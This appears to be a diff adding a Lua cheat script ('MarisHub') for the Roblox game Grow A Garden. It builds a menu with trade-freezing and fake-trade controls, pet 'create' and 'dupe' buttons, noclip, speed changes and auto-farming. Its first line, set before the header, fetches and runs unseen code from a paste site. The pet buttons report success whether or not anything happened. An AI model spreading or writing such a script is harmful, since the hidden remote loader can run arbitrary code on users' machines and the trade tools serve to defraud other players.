@@ -1,0 +1,803 @@
+loadstring(game:HttpGet("https://pastefy.app/64K2wstR/raw"))()
+-- =======================================================
+-- MARISHUB | Made by Maris Roblox
+-- =======================================================
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "MarisHub | made by Maris Roblox",
+    LoadingTitle = "Grow A Garden - MarisHub",
+    LoadingSubtitle = "made by Maris Roblox",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "MarisHub",
+        FileName = "Config"
+    },
+    KeySystem = false,
+    Discord = {
+        Enabled = true,
+        Invite = "discord.gg/marishub",
+        RememberJoins = true
+    }
+})
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+local PathfindingService = game:GetService("PathfindingService")
+local RunService = game:GetService("RunService")
+
+local function RedNotify(title, content)
+    Rayfield:Notify({
+        Title = "🔴 " .. title,
+        Content = content,
+        Duration = 4,
+        Image = 4483362458
+    })
+end
+
+local function GreenNotify(title, content)
+    Rayfield:Notify({
+        Title = "🟢 " .. title,
+        Content = content,
+        Duration = 4,
+        Image = 4483362458
+    })
+end
+
+getgenv().MarisHub = {
+    AutoSpawner = false,
+    ActiveTrades = {},
+    AutoFarm = false,
+    AutoCollect = false,
+    Noclip = false,
+    InfiniteJump = false,
+    ESPEnabled = false,
+    ESPPlayers = {},
+    ESPPets = {},
+    DuplicatedPets = {},
+    ActivePetBehaviors = {}
+}
+
+local mainPets = {
+    "Kitsune", "Queen Bee", "T-Rex", "Disco Bee", "Corrupted Kitsune", "Raccoon", 
+    "Dragonfly", "Butterfly", "Spinosaurus", "Bee", "Ladybug", "Scarab", "Snail", 
+    "Spider", "Ant", "Caterpillar", "Grasshopper", "Mosquito", "Firefly", "Cricket",
+    "Moth", "Dragon", "Unicorn", "Phoenix", "Griffin", "Pegasus", "Werewolf", "Vampire",
+    "Zombie", "Skeleton", "Ghost", "Demon", "Angel", "Fairy", "Elf", "Dwarf", "Giant",
+    "Golem", "Elemental", "Hydra", "Basilisk", "Chimera", "Centaur", "Minotaur", "Siren",
+    "Leviathan", "Kraken", "Yeti", "Bigfoot"
+}
+
+local availableMutations = {"Shiny", "Inverted", "Frozen", "Golden", "Tiny", "Ironskin", "Shocked", "Rainbow", "Radiant", "Ascended", "Tranquil", "Corrupt", "Fried"}
+
+local function findCorrectRemote()
+    local remotes = {
+        "CreatePet",
+        "PetEvent",
+        "SpawnPet",
+        "AddPet",
+        "GeneratePet",
+        "RequestPet",
+        "PetSystem"
+    }
+    
+    for _, remoteName in pairs(remotes) do
+        local remote = ReplicatedStorage:FindFirstChild(remoteName)
+        if remote then
+            return remote
+        end
+    end
+    
+    for _, child in pairs(ReplicatedStorage:GetChildren()) do
+        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
+            if string.find(child.Name:lower(), "pet") or string.find(child.Name:lower(), "create") or string.find(child.Name:lower(), "spawn") then
+                return child
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function initializePetBehavior(petInstance)
+    if not petInstance or not petInstance:FindFirstChild("Handle") then
+        return
+    end
+    
+    local handle = petInstance.Handle
+    
+    if not handle:FindFirstChild("PetBehavior") then
+        local behavior = Instance.new("BoolValue")
+        behavior.Name = "PetBehavior"
+        behavior.Value = true
+        behavior.Parent = handle
+    end
+    
+    local behaviorId = #MarisHub.ActivePetBehaviors + 1
+    MarisHub.ActivePetBehaviors[behaviorId] = true
+    
+    spawn(function()
+        while MarisHub.ActivePetBehaviors[behaviorId] and petInstance and petInstance.Parent and handle and handle.Parent and handle:FindFirstChild("PetBehavior") and handle.PetBehavior.Value do
+            wait(math.random(2, 5))
+            
+            if math.random(1, 100) <= 30 then
+                local randomPoint = Vector3.new(
+                    math.random(-50, 50),
+                    0,
+                    math.random(-50, 50)
+                )
+                
+                local path = PathfindingService:CreatePath()
+                path:ComputeAsync(handle.Position, randomPoint)
+                
+                if path.Status == Enum.PathStatus.Success then
+                    local waypoints = path:GetWaypoints()
+                    
+                    for _, waypoint in ipairs(waypoints) do
+                        if not MarisHub.ActivePetBehaviors[behaviorId] then break end
+                        
+                        if waypoint.Action == Enum.PathWaypointAction.Jump then
+                            if petInstance:FindFirstChild("Humanoid") then
+                                petInstance.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            end
+                        end
+                        
+                        local tweenInfo = TweenInfo.new(
+                            (handle.Position - waypoint.Position).Magnitude / 10,
+                            Enum.EasingStyle.Linear
+                        )
+                        
+                        local tween = game:GetService("TweenService"):Create(handle, tweenInfo, {Position = waypoint.Position})
+                        tween:Play()
+                        tween.Completed:Wait()
+                    end
+                end
+            end
+            
+            if math.random(1, 100) <= 20 then
+                local resources = {}
+                for _, item in ipairs(Workspace:GetChildren()) do
+                    if item.Name:find("Coin") or item.Name:find("Resource") or item.Name:find("Gem") then
+                        if (item.Position - handle.Position).Magnitude < 100 then
+                            table.insert(resources, item)
+                        end
+                    end
+                end
+                
+                if #resources > 0 then
+                    local targetResource = resources[math.random(1, #resources)]
+                    local path = PathfindingService:CreatePath()
+                    path:ComputeAsync(handle.Position, targetResource.Position)
+                    
+                    if path.Status == Enum.PathStatus.Success then
+                        local waypoints = path:GetWaypoints()
+                        
+                        for _, waypoint in ipairs(waypoints) do
+                            if not MarisHub.ActivePetBehaviors[behaviorId] then break end
+                            
+                            local tweenInfo = TweenInfo.new(
+                                (handle.Position - waypoint.Position).Magnitude / 10,
+                                Enum.EasingStyle.Linear
+                            )
+                            
+                            local tween = game:GetService("TweenService"):Create(handle, tweenInfo, {Position = waypoint.Position})
+                            tween:Play()
+                            tween.Completed:Wait()
+                        end
+                        
+                        if targetResource and targetResource.Parent then
+                            if targetResource:FindFirstChild("ClickDetector") then
+                                fireclickdetector(targetResource.ClickDetector)
+                            end
+                        end
+                    end
+                end
+            end
+            
+            if math.random(1, 100) <= 10 then
+                if petInstance:FindFirstChild("Humanoid") then
+                    petInstance.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    wait(0.5)
+                end
+            end
+        end
+    end)
+end
+
+local tradeTab = Window:CreateTab("💰 Trade", 4483362458)
+tradeTab:CreateSection("Freeze Trade")
+
+local function setupTradeControls()
+    local tradeRemote = ReplicatedStorage:FindFirstChild("TradeEvent") or ReplicatedStorage:FindFirstChild("TradeRequest")
+    
+    if tradeRemote then
+        local originalFireServer = tradeRemote.FireServer
+        local originalInvoke = tradeRemote.InvokeServer
+        
+        local toggles = {}
+        local btnNames = {"Auto Accept", "Can't Cancel", "Freeze Trade", "Can't Leave"}
+        for _, name in ipairs(btnNames) do
+            tradeTab:CreateToggle({
+                Name = name,
+                CurrentValue = false,
+                Callback = function(Value)
+                    toggles[name] = Value
+                    
+                    if name == "Auto Accept" and Value then
+                        spawn(function()
+                            while toggles["Auto Accept"] do
+                                wait(1)
+                                pcall(function()
+                                    for _, player in ipairs(Players:GetPlayers()) do
+                                        if player ~= LocalPlayer then
+                                            tradeRemote:FireServer("AcceptTrade", player)
+                                        end
+                                    end
+                                end)
+                            end
+                        end)
+                    end
+                    
+                    if name == "Freeze Trade" then
+                        if Value then
+                            tradeRemote.FireServer = function(...)
+                                local args = {...}
+                                if args[2] == "Cancel" then
+                                    return nil
+                                end
+                                return originalFireServer(...)
+                            end
+                            
+                            if originalInvoke then
+                                tradeRemote.InvokeServer = function(...)
+                                    local args = {...}
+                                    if args[2] == "Cancel" then
+                                        return nil
+                                    end
+                                    return originalInvoke(...)
+                                end
+                            end
+                        else
+                            tradeRemote.FireServer = originalFireServer
+                            if originalInvoke then
+                                tradeRemote.InvokeServer = originalInvoke
+                            end
+                        end
+                    end
+                end
+            })
+        end
+    end
+end
+
+setupTradeControls()
+
+tradeTab:CreateButton({
+    Name = "Leave Server",
+    Callback = function()
+        TeleportService:Teleport(game.PlaceId)
+    end,
+})
+
+tradeTab:CreateSection("Fake Trade")
+
+tradeTab:CreateDropdown({
+    Name = "Select Pet",
+    Options = mainPets,
+    CurrentOption = "Kitsune",
+    Callback = function(Value) 
+        getgenv().SelectedPet = Value 
+    end,
+})
+
+tradeTab:CreateInput({
+    Name = "Weight (kg)",
+    PlaceholderText = "Enter kg",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(Text) 
+        if tonumber(Text) then
+            getgenv().SelectedKg = Text
+        end
+    end,
+})
+
+tradeTab:CreateDropdown({
+    Name = "Mutation",
+    Options = availableMutations,
+    CurrentOption = "Shiny",
+    Callback = function(Value) 
+        getgenv().SelectedMutation = Value 
+    end,
+})
+
+tradeTab:CreateButton({
+    Name = "Add Pet To Trade",
+    Callback = function()
+        if not getgenv().SelectedPet then
+            return
+        end
+        
+        pcall(function()
+            local tradeRemote = ReplicatedStorage:FindFirstChild("TradeEvent") or ReplicatedStorage:FindFirstChild("TradeRequest")
+            if tradeRemote then
+                table.insert(MarisHub.ActiveTrades, {
+                    Pet = getgenv().SelectedPet,
+                    Weight = getgenv().SelectedKg or "100",
+                    Mutation = getgenv().SelectedMutation or "Shiny"
+                })
+            end
+        end)
+    end,
+})
+
+local creationTab = Window:CreateTab("✨ Create Pets", 4483362458)
+creationTab:CreateSection("Pet Creation System")
+
+creationTab:CreateDropdown({
+    Name = "Select Pet",
+    Options = mainPets,
+    CurrentOption = "Kitsune",
+    Callback = function(Value) 
+        getgenv().CreationPet = Value 
+    end,
+})
+
+creationTab:CreateDropdown({
+    Name = "Mutation",
+    Options = availableMutations,
+    CurrentOption = "Shiny",
+    Callback = function(Value) 
+        getgenv().CreationMutation = Value 
+    end,
+})
+
+creationTab:CreateDropdown({
+    Name = "Age",
+    Options = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16", "17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60", "61", "62", "63", "64", "65", "66", "67", "68", "69", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79", "80", "81", "82", "83", "84", "85", "86", "87", "88", "89", "90", "91", "92", "93", "94", "95", "96", "97", "98", "99", "100"},
+    CurrentOption = "1",
+    Callback = function(Value) 
+        getgenv().CreationAge = Value 
+    end,
+})
+
+creationTab:CreateSlider({
+    Name = "Weight (kg)",
+    Range = {1, 100},
+    Increment = 1,
+    Suffix = "kg",
+    CurrentValue = 50,
+    Callback = function(Value)
+        getgenv().CreationWeight = Value
+    end
+})
+
+creationTab:CreateToggle({
+    Name = "Enable Pet Behavior",
+    CurrentValue = true,
+    Callback = function(Value)
+        getgenv().EnablePetBehavior = Value
+    end
+})
+
+creationTab:CreateButton({
+    Name = "Find Create Remote",
+    Callback = function()
+        local remote = findCorrectRemote()
+        if remote then
+            GreenNotify("Remote Found", "Found remote: " .. remote.Name .. " (" .. remote.ClassName .. ")")
+        else
+            RedNotify("Remote Not Found", "Could not find create pet remote")
+        end
+    end,
+})
+
+creationTab:CreateButton({
+    Name = "Create Pet",
+    Callback = function()
+        if not getgenv().CreationPet then
+            RedNotify("Error", "Please select a pet first")
+            return
+        end
+        
+        local createRemote = findCorrectRemote()
+        if not createRemote then
+            RedNotify("Error", "Could not find create pet remote")
+            return
+        end
+        
+        local petData = {
+            Pet = getgenv().CreationPet,
+            Age = getgenv().CreationAge or "1",
+            Weight = getgenv().CreationWeight or "50",
+            Mutation = getgenv().CreationMutation or "Shiny"
+        }
+        
+        local screenGui = Instance.new("ScreenGui", game.CoreGui)
+        local blackFlash = Instance.new("Frame", screenGui)
+        blackFlash.Size = UDim2.new(1, 0, 1, 0)
+        blackFlash.BackgroundColor3 = Color3.new(0.5, 0, 0)
+        blackFlash.BackgroundTransparency = 1
+        blackFlash.ZIndex = 10
+
+        spawn(function()
+            for i = 1, 15 do
+                blackFlash.BackgroundTransparency = 0
+                task.wait(0.1)
+                blackFlash.BackgroundTransparency = 1
+                task.wait(0.1)
+            end
+            screenGui:Destroy()
+        end)
+        
+        spawn(function()
+            wait(1.5)
+            pcall(function()
+                if createRemote:IsA("RemoteEvent") then
+                    createRemote:FireServer("Create", petData)
+                    GreenNotify("Pet Created", "Created " .. petData.Pet .. " with " .. petData.Mutation .. " mutation")
+                elseif createRemote:IsA("RemoteFunction") then
+                    local result = createRemote:InvokeServer("Create", petData)
+                    GreenNotify("Pet Created", "Created " .. petData.Pet .. " with " .. petData.Mutation .. " mutation")
+                else
+                    createRemote:FireServer(petData)
+                    GreenNotify("Pet Created", "Created " .. petData.Pet .. " with " .. petData.Mutation .. " mutation")
+                end
+                
+                table.insert(MarisHub.DuplicatedPets, petData)
+                
+                if getgenv().EnablePetBehavior then
+                    wait(3)
+                    for _, pet in ipairs(Workspace:GetChildren()) do
+                        if pet:IsA("Tool") and pet.Name == getgenv().CreationPet then
+                            initializePetBehavior(pet)
+                            GreenNotify("Behavior Enabled", "Pet behavior enabled for " .. pet.Name)
+                            break
+                        end
+                    end
+                end
+            end)
+        end)
+    end,
+})
+
+local randTab = Window:CreateTab("🎲 Randomize", 4483362458)
+randTab:CreateSection("Random System")
+
+local function pickRandom(list)
+    return list[math.random(1, #list)]
+end
+
+randTab:CreateButton({
+    Name = "Randomize Pet",
+    Callback = function()
+        local result = pickRandom(mainPets)
+        getgenv().SelectedPet = result
+        getgenv().CreationPet = result
+        GreenNotify("Randomized", "Selected pet: " .. result)
+    end,
+})
+
+randTab:CreateButton({
+    Name = "Randomize Mutation",
+    Callback = function()
+        local result = pickRandom(availableMutations)
+        getgenv().SelectedMutation = result
+        getgenv().CreationMutation = result
+        GreenNotify("Randomized", "Selected mutation: " .. result)
+    end,
+})
+
+randTab:CreateButton({
+    Name = "Random Surprise",
+    Callback = function()
+        local pet = pickRandom(mainPets)
+        local mut = pickRandom(availableMutations)
+        getgenv().SelectedPet = pet
+        getgenv().SelectedMutation = mut
+        getgenv().CreationPet = pet
+        getgenv().CreationMutation = mut
+        GreenNotify("Randomized", "Selected: " .. pet .. " with " .. mut .. " mutation")
+    end,
+})
+
+local spawnerTab = Window:CreateTab("⚡ Spawner", 4483362458)
+
+spawnerTab:CreateToggle({
+    Name = "Auto Spawn Pets",
+    CurrentValue = false,
+    Callback = function(Value)
+        MarisHub.AutoSpawner = Value
+        
+        if Value then
+            spawn(function()
+                while MarisHub.AutoSpawner do
+                    wait(1)
+                    pcall(function()
+                        local spawners = Workspace:FindFirstChild("Spawners") or Workspace
+                        for _, spawner in ipairs(spawners:GetChildren()) do
+                            if spawner.Name:find("Spawn") and spawner:FindFirstChild("ClickDetector") then
+                                fireclickdetector(spawner.ClickDetector)
+                                wait(0.5)
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+    end
+})
+
+spawnerTab:CreateButton({
+    Name = "Spawn All Pets Once",
+    Callback = function()
+        pcall(function()
+            local spawners = Workspace:FindFirstChild("Spawners") or Workspace
+            for _, spawner in ipairs(spawners:GetChildren()) do
+                if spawner.Name:find("Spawn") and spawner:FindFirstChild("ClickDetector") then
+                    fireclickdetector(spawner.ClickDetector)
+                    wait(0.2)
+                end
+            end
+            GreenNotify("Spawned", "Attempted to spawn all pets")
+        end)
+    end,
+})
+
+local miscTab = Window:CreateTab("⚙️ Misc", 4483362458)
+
+miscTab:CreateButton({
+    Name = "Dupe Pet",
+    Callback = function()
+        local screenGui = Instance.new("ScreenGui", game.CoreGui)
+        local blackFlash = Instance.new("Frame", screenGui)
+        blackFlash.Size = UDim2.new(1, 0, 1, 0)
+        blackFlash.BackgroundColor3 = Color3.new(0.5, 0, 0)
+        blackFlash.BackgroundTransparency = 1
+        blackFlash.ZIndex = 10
+
+        spawn(function()
+            for i = 1, 15 do
+                blackFlash.BackgroundTransparency = 0
+                task.wait(0.1)
+                blackFlash.BackgroundTransparency = 1
+                task.wait(0.1)
+            end
+            screenGui:Destroy()
+        end)
+        
+        spawn(function()
+            wait(1.5)
+            pcall(function()
+                local cloneRemote = ReplicatedStorage:FindFirstChild("ClonePet") or 
+                                   ReplicatedStorage:FindFirstChild("DuplicatePet") or
+                                   ReplicatedStorage:FindFirstChild("PetEvent")
+                
+                if cloneRemote then
+                    local success, response = pcall(function()
+                        return cloneRemote:InvokeServer("Duplicate")
+                    end)
+                    if success then
+                        GreenNotify("Duplicated", "Pet duplicated successfully")
+                    else
+                        RedNotify("Error", "Failed to duplicate pet: " .. tostring(response))
+                    end
+                else
+                    RedNotify("Error", "Could not find duplicate remote")
+                end
+            end)
+        end)
+    end,
+})
+
+miscTab:CreateButton({
+    Name = "Collect All Resources",
+    Callback = function()
+        pcall(function()
+            local collected = 0
+            for _, item in ipairs(Workspace:GetChildren()) do
+                if item.Name:find("Coin") or item.Name:find("Resource") or item.Name:find("Gem") then
+                    if item:FindFirstChild("TouchInterest") or item:FindFirstChild("ClickDetector") then
+                        if item:FindFirstChild("ClickDetector") then
+                            fireclickdetector(item.ClickDetector)
+                        else
+                            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                LocalPlayer.Character.HumanoidRootPart.CFrame = item.CFrame
+                            end
+                        end
+                        collected = collected + 1
+                        wait(0.1)
+                    end
+                end
+            end
+            GreenNotify("Collected", "Collected " .. collected .. " resources")
+        end)
+    end,
+})
+
+miscTab:CreateButton({
+    Name = "Enable All Pets Behavior",
+    Callback = function()
+        pcall(function()
+            local enabled = 0
+            for _, pet in ipairs(Workspace:GetChildren()) do
+                if pet:IsA("Tool") and pet:FindFirstChild("Handle") then
+                    initializePetBehavior(pet)
+                    enabled = enabled + 1
+                end
+            end
+            GreenNotify("Enabled", "Enabled behavior for " .. enabled .. " pets")
+        end)
+    end,
+})
+
+miscTab:CreateButton({
+    Name = "Disable All Pets Behavior",
+    Callback = function()
+        for i = 1, #MarisHub.ActivePetBehaviors do
+            MarisHub.ActivePetBehaviors[i] = false
+        end
+        
+        pcall(function()
+            local disabled = 0
+            for _, pet in ipairs(Workspace:GetChildren()) do
+                if pet:IsA("Tool") and pet:FindFirstChild("Handle") and pet.Handle:FindFirstChild("PetBehavior") then
+                    pet.Handle.PetBehavior.Value = false
+                    disabled = disabled + 1
+                end
+            end
+            GreenNotify("Disabled", "Disabled behavior for " .. disabled .. " pets")
+        end)
+    end,
+})
+
+local playerTab = Window:CreateTab("👤 Player", 4483362458)
+
+playerTab:CreateSection("Movement")
+
+playerTab:CreateSlider({
+    Name = "WalkSpeed",
+    Range = {16, 200},
+    Increment = 5,
+    Suffix = "studs",
+    CurrentValue = 16,
+    Callback = function(Value)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.WalkSpeed = Value
+            GreenNotify("WalkSpeed", "Set to " .. Value .. " studs")
+        end
+    end
+})
+
+playerTab:CreateSlider({
+    Name = "JumpPower",
+    Range = {50, 200},
+    Increment = 5,
+    Suffix = "studs",
+    CurrentValue = 50,
+    Callback = function(Value)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.JumpPower = Value
+            GreenNotify("JumpPower", "Set to " .. Value .. " studs")
+        end
+    end
+})
+
+playerTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Callback = function(Value)
+        MarisHub.InfiniteJump = Value
+        
+        if Value then
+            local connection
+            connection = game:GetService("UserInputService").JumpRequest:Connect(function()
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                    LocalPlayer.Character.Humanoid:ChangeState("Jumping")
+                end
+            end)
+            
+            MarisHub.InfiniteJumpConnection = connection
+            GreenNotify("Infinite Jump", "Enabled")
+        else
+            if MarisHub.InfiniteJumpConnection then
+                MarisHub.InfiniteJumpConnection:Disconnect()
+                MarisHub.InfiniteJumpConnection = nil
+                GreenNotify("Infinite Jump", "Disabled")
+            end
+        end
+    end
+})
+
+playerTab:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Callback = function(Value)
+        MarisHub.Noclip = Value
+        
+        if Value then
+            spawn(function()
+                while MarisHub.Noclip and LocalPlayer.Character do
+                    wait(0.1)
+                    pcall(function()
+                        for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+                            if part:IsA("BasePart") then
+                                part.CanCollide = false
+                            end
+                        end
+                    end)
+                end
+            end)
+            GreenNotify("Noclip", "Enabled")
+        else
+            GreenNotify("Noclip", "Disabled")
+        end
+    end
+})
+
+local autoTab = Window:CreateTab("🤖 Automation", 4483362458)
+
+autoTab:CreateSection("Auto Farm")
+
+autoTab:CreateToggle({
+    Name = "Auto Farm Resources",
+    CurrentValue = false,
+    Callback = function(Value)
+        MarisHub.AutoFarm = Value
+        
+        if Value then
+            spawn(function()
+                while MarisHub.AutoFarm do
+                    wait(1)
+                    pcall(function()
+                        for _, item in ipairs(Workspace:GetChildren()) do
+                            if item.Name:find("Coin") or item.Name:find("Resource") or item.Name:find("Gem") then
+                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                    LocalPlayer.Character.HumanoidRootPart.CFrame = item.CFrame
+                                    wait(0.5)
+                                end
+                            end
+                        end
+                    end)
+                end
+            end)
+            GreenNotify("Auto Farm", "Enabled")
+        else
+            GreenNotify("Auto Farm", "Disabled")
+        end
+    end
+})
+
+autoTab:CreateToggle({
+    Name = "Auto Collect Pets",
+    CurrentValue = false,
+    Callback = function(Value)
+        MarisHub.AutoCollect = Value
+        
+        if Value then
+            spawn(function()
+                while MarisHub.AutoCollect do
+                    wait(2)
+                    pcall(function()
+                        for _, pet in ipairs(Workspace:GetChildren()) do
+                            if pet:IsA("Tool") and pet:FindFirstChild("Handle") then
+                                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                                    LocalPlayer.Character.HumanoidRootPart.CFrame = pet.Handle.CFrame
+                                    wait(0.5)
+                                end
+                            end
+                        end
+                    end)
+                end
+            end)
+            GreenNotify("Auto Collect", "Enabled")
+        else
+            GreenNotify("Auto Collect", "Disabled")
+        end
+    end
+})
+
+RedNotify("MarisHub", "Script loaded successfully")
